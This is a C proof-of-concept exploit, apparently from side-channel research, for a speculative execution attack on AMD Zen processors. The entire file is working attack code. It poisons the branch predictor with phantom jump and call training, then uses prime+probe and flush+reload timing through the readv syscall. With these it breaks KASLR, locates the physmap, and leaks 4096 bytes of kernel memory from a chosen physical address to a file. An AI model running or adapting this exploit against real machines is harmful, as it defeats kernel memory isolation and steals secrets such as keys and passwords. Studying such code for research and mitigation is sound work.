#define _GNU_SOURCE

#include "../noise.h"
#include "../phys.h"
#include <assert.h>
#include <inttypes.h>
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define HUGEPAGE 2097152
#define SETS     1024
#define WAYS     8

#define ROUNDS      100
#define FAST_ROUNDS 25

#define LEAK_BYTE_GADGET     0x70c4a6 - 0x3
#define LEAK_PHYS_GADET      0xf22a44 - 0x3
#define LEAK_PHYSMAP_GADET   LEAK_PHYS_GADET + 7
#define PHANTOM_JMP_LOCATION 0x41db94

#if defined(ZEN2)
#define PTRN 0xffff800800000000
#else
#define PTRN 0xffff804000000000
#endif

sigjmp_buf mark;
uint64_t base;

void segfault_handler(int sig_num) {
    siglongjmp(mark, 1);
}

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t lo, hi;
    asm volatile("CPUID\n\t"
                 "RDTSC\n\t"
                 "movq %%rdx, %0\n\t"
                 "movq %%rax, %1\n\t"
                 : "=r"(hi), "=r"(lo)::"%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

// stop meassure.
static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
    uint64_t lo, hi;
    asm volatile("RDTSCP\n\t"
                 "movq %%rdx, %0\n\t"
                 "movq %%rax, %1\n\t"
                 "CPUID\n\t"
                 : "=r"(hi), "=r"(lo)::"%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) int reload_base() {
    __asm__ volatile("mfence\n");
    unsigned volatile char *p = (uint8_t *) base;
    uint64_t t0 = rdtsc();
    *(volatile unsigned char *) p;
    uint64_t dt = rdtscp() - t0;

    __asm__ volatile("clflushopt (%0)\n" ::"r"(base));

    if (dt < 200)
        return 1;
    return 0;
}

uint64_t training_jmp;
uint64_t training_call;
uint64_t victim_phantom_call;

void set_training_addrs(uint64_t jmp_loc, uint64_t call_loc) {
    training_jmp = jmp_loc ^ PTRN;
    training_call = call_loc ^ PTRN;
    victim_phantom_call = call_loc;

    mmap((void *) (training_jmp & ~0xfff), 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
    mmap((void *) (training_call & ~0xfff), 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);

    *(uint32_t *) training_jmp = 0x00e0ff41;  // jmp *%r8
    *(uint32_t *) training_call = 0x00d0ff41; // call *%r8
}

void unset_training_addrs() {
    munmap((void *) (training_jmp & ~0xfff), 4096);
    munmap((void *) (training_call & ~0xfff), 4096);
}

static inline __attribute__((always_inline)) void insert_p_jmp() {
    if (sigsetjmp(mark, 1) == 0) {
        asm("mov %0, %%r8\n\t"
            "jmp *%[br_src]\n\t" ::"r"(victim_phantom_call),
            [br_src] "r"(training_jmp)
            : "r8");
    }
}

static inline __attribute__((always_inline)) void insert_p_call() {
    if (sigsetjmp(mark, 1) == 0) {
        asm("mov %0, %%r8\n\t"
            "jmp *%[br_src]\n\t" ::"r"(victim_phantom_call),
            [br_src] "r"(training_call)
            : "r8");
    }
}

uint64_t trigger_inception(uint64_t rsi_val, uint64_t rdx_val, int iterations) {
    uint64_t res = 0;
    insert_p_call();

    __asm__ volatile("clflushopt (%0)\n" ::"r"(base));

    for (int i = 0; i < iterations; i++) {
        insert_p_jmp();

        syscall(SYS_readv, 0x0, rsi_val, rdx_val);

        res += reload_base();
    }

    return res;
}

int64_t prime_probe_guess(uint64_t guess, int set, uint64_t start) {
    uint64_t dt[2] = {0};

    set_training_addrs(guess + PHANTOM_JMP_LOCATION, guess + LEAK_PHYSMAP_GADET);

    insert_p_call();

    for (int i = 0; i < ROUNDS; i++) {
        for (int l = 0; l < 2; l++) {
            // When l == 0, we create contention in the wrong set (+1)
            void *goal = l == 0 ? (void *) guess + (((set + 1) % SETS) * 0x40)
                                : (void *) guess + (set * 0x40);

            insert_p_jmp();

            // Prime the cache set
            uint64_t *curr = (uint64_t *) start;
            for (int k = 0; k < 8; k++) {
                curr = (uint64_t *) *curr;
            }

            syscall(SYS_readv, 0x0, goal, 0x0);

            // Measure influence of preceding syscall
            uint64_t t0 = rdtsc();
            for (int k = 0; k < 8; k++) {
                curr = (uint64_t *) *curr;
            }
            dt[l] += rdtscp() - t0;
        }
    }

    unset_training_addrs();

    // Return difference between contention in correct set and wrong set
    return (dt[1] / ROUNDS) - (dt[0] / ROUNDS);
}

void get_addrs(uint64_t *buf, uint64_t set, int n) {
    for (int i = 0; i < n; i++) {
        uint64_t c = (7 * i + 12) & (n - 1);
        buf[i] = ((((((uint64_t) base) >> 16) + c) << 10) + set) << 6;
        if (i > 0)
            *((uint64_t *) buf[i - 1]) = buf[i];
    }

    *((uint64_t *) buf[n - 1]) = buf[0];
}

uint64_t find_text() {
    uint64_t addrs[SETS * WAYS];
    for (int i = 0; i < SETS; i++) {
        get_addrs(addrs + (WAYS * i), i, WAYS);
    }

    while (1) {
        printf(".");
        fflush(stdout);

        int set = rand() % SETS;
        for (uint64_t guess = 0xffffffff81000000;
             guess < 0xffffffff81000000 + 495 * 0x200000; guess += 0x200000) {
            if (prime_probe_guess(guess, set, addrs[set * WAYS]) >= 30) {
                set = rand() % SETS;
                // Double check with a different set
                if (prime_probe_guess(guess, set, addrs[set * WAYS]) >= 30) {
                    set = rand() % SETS;
                    // Double-double check with again a different set
                    if (prime_probe_guess(guess, set, addrs[set * WAYS]) >= 30) {
                        printf("\n");
                        return guess;
                    }
                }
            }
        }
    }
}

uint64_t find_phys(uint64_t text) {
    int it = 0;
    unsigned long phys = 0;

    set_training_addrs(text + PHANTOM_JMP_LOCATION, text + LEAK_PHYS_GADET);

    for (int i = 0; i < 3; i++) {
        for (int block = 0; block < phys_blocks.nblocks; block++) {
            for (uint64_t phys_guess = phys_blocks.blocks[block] * phys_blocks.block_size;
                 phys_guess < (phys_blocks.blocks[block] + 1) * phys_blocks.block_size;
                 phys_guess += HUGEPAGE) {
                if (it % 500 == 0) {
                    printf(".");
                    fflush(stdout);
                }

                if (trigger_inception(phys_guess, 0x0, FAST_ROUNDS)) {
                    printf("\n");
                    return phys_guess;
                }

                it++;
            }
        }
    }

    unset_training_addrs();

    return 0x0;
}

uint64_t find_physmap(uint64_t text, uint64_t phys) {
    unsigned long physmap = 0xffff888000000000;
    int it = 0;

    set_training_addrs(text + PHANTOM_JMP_LOCATION, text + LEAK_PHYSMAP_GADET);

    for (int i = 0; i < 3; i++) {
        for (uint64_t physmap_guess = 0xffff888000000000;
             physmap_guess <= 0xfffffe0000000000; physmap_guess += 0x40000000) {
            if (it % 500 == 0) {
                printf(".");
                fflush(stdout);
            }

            insert_p_call();

            if (trigger_inception(physmap_guess + phys, 0x0, FAST_ROUNDS)) {
                printf("\n");
                return physmap_guess;
            }

            it++;
        }
    }

    unset_training_addrs();

    return 0x0;
}

uint8_t leak_byte(unsigned long physmap, unsigned long phys, unsigned long addr) {
    for (int k = 0; k < 10; k++) {
        uint64_t max = 0;
        int idx = 0;
        for (int i = 0; i < 256; i += 32) {
            uint64_t cnt = 0;
            for (int j = 0; j < 4; j++)
                cnt +=
                    trigger_inception(phys + physmap - (i * 2), addr - 0x2, FAST_ROUNDS);

            if (cnt > max) {
                max = cnt;
                idx = i;
            }
        }

        for (int j = idx - 31; j <= idx; j++) {
            if (trigger_inception(phys + physmap - (j * 2), addr - 0x2, FAST_ROUNDS) >=
                3) {
                if (trigger_inception(phys + physmap - ((j - 1) * 2), addr - 0x2,
                                      FAST_ROUNDS) > 0) {
                    j -= 2;
                    continue;
                }

                if (trigger_inception(phys + physmap - ((j + 1) * 2), addr - 0x2,
                                      FAST_ROUNDS) == 0) {
                    continue;
                }

                return j + 31;
            }
        }
    }

    return 0x0;
}

int main(int argc, char **argv) {
    srand(time(NULL));
    signal(SIGSEGV, segfault_handler);

#ifndef SHADOW
    assert(argc == 2);

    // secret_ptr is the physical address from which we want to leak, and is user-provided
    unsigned long secret_ptr = strtoul(argv[1], NULL, 16);
#endif

    phys_blocks_init();

    pid_t sibling_proc = run_sibling_noise("./workload", CORE2);
    set_cpu_affinity(CORE1);

    base = (uint64_t) aligned_alloc(HUGEPAGE, HUGEPAGE);
    madvise((void *) base, HUGEPAGE, MADV_HUGEPAGE);
    mprotect((void *) base, HUGEPAGE, PROT_READ | PROT_WRITE | PROT_EXEC);

    time_t s = time(NULL);

    unsigned long text = find_text();

    printf("Text: %p\n", (void *) text);

    uint64_t phys = find_phys(text);
    if (phys == 0x0) {
        printf("Did not found physical address of reload buffer. Retry...\n");
        kill(sibling_proc, SIGKILL);
        return 1;
    }

    printf("Phys: %p\n", (void *) phys);

    uint64_t physmap = find_physmap(text, phys);
    if (physmap == 0x0) {
        printf("Did not found physmap. Retry...\n");
        kill(sibling_proc, SIGKILL);
        return 1;
    }

    printf("Physmap: %p\n", (void *) physmap);

    time_t e = time(NULL);
    printf("Took %ld seconds to break KASLR\n", e - s);

    set_training_addrs(text + PHANTOM_JMP_LOCATION, text + LEAK_BYTE_GADGET);

    s = time(NULL);

    uint8_t buffer[4096];
    for (int k = 0; k < 4096; k++) {
        buffer[k] = leak_byte(physmap, phys, secret_ptr + k);
        printf("%c", buffer[k]);
        fflush(stdout);
    }

    e = time(NULL);

    printf("\n");

    FILE *fptr;
    fptr = fopen("data.bin", "wb");
    fwrite(buffer, 1, 4096, fptr);
    fclose(fptr);

    printf("%d bytes in %ld sec. That's %ld bytes/s.\n", 4096, e - s,
           4096 / ((e - s) > 0 ? (e - s) : 1));

    unset_training_addrs();

    kill(sibling_proc, SIGKILL);

    return 0;
}
